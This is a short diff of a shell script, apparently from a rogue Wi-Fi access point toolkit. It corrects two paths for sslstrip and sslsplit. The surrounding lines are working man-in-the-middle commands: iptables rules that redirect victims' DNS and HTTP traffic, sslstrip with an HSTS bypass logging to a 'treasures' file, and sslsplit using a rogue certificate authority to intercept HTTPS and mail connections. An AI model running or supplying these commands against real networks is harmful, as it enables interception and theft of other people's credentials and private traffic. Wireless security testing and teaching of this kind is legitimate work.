@@ -189,7 +189,7 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 
 #SSLStrip with HSTS bypass
 echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting sslstrip with HSTS bypass"
-cd /root/mana/sslstrip-hsts/sslstrip-hsts/
+cd /root/mana/sslstrip-hsts/
 python sslstrip.py -l 10000 -a -w /root/mana/treasures/sslstrip.log&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 python dns2proxy.py $phy&
@@ -198,7 +198,7 @@ cd -
 
 #SSLSplit
 echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting sslsplit with HSTS bypass"
-sslsplit -D -P -Z -S /root/mana/sslstrip-hsts/sslsplit -c /root/mana/run-mana/cert/rogue-ca.pem -k /root/mana/run-mana/cert/cert/rogue-ca.key -O -l /root/mana/logfiles/sslsplit-connect.log \
+sslsplit -D -P -Z -S /root/mana/sslstrip-hsts/sslsplit -c /root/mana/run-mana/cert/rogue-ca.pem -k /root/mana/run-mana/cert/rogue-ca.key -O -l /root/mana/logfiles/sslsplit-connect.log \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
